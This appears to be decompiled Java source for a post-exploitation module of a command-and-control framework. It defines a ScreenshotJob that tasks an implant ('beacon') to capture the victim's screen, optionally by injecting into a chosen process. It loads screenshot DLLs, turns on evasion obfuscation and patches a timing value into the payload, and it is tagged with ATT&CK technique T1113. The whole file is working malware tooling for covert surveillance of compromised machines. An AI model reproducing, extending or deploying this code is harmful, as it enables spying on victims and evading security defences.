package beacon.jobs;

import beacon.Job;
import beacon.TaskBeacon;
import common.CommonUtils;
import common.Packer;
import pe.PostExObfuscator;

public class ScreenshotJob extends Job {
   protected int time;

   public ScreenshotJob(TaskBeacon var1, int var2) {
      super(var1);
      this.time = var2 * 1000;
   }

   public String getDescription() {
      if (this.isInject() && this.time > 0) {
         return "Tasked beacon to take screenshots in " + this.pid + "/" + this.arch + " for next " + this.time / 1000 + " seconds";
      } else if (this.isInject()) {
         return "Tasked beacon to take a screenshot in " + this.pid + "/" + this.arch;
      } else {
         return this.time > 0 ? "Tasked beacon to take screenshots for next " + this.time / 1000 + " seconds" : "Tasked beacon to take screenshot";
      }
   }

   public String getShortDescription() {
      return "take screenshot";
   }

   public String getDLLName() {
      return this.arch.equals("x64") ? "resources/screenshot.x64.dll" : "resources/screenshot.dll";
   }

   public String getPipeName() {
      return "screenshot";
   }

   public int getCallbackType() {
      return 3;
   }

   public int getWaitTime() {
      return 15000;
   }

   public void obfuscate(PostExObfuscator var1, byte[] var2) {
      var1.enableEvasions();
   }

   public byte[] fix(byte[] var1) {
      Packer var2 = new Packer();
      var2.little();
      var2.addInt(this.time);
      String var3 = CommonUtils.pad(CommonUtils.bString(var2.getBytes()), '\u0000', 128);
      var1 = CommonUtils.patch(var1, "AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRR", var3);
      return var1;
   }

   public String getTactic() {
      return "T1113";
   }
}
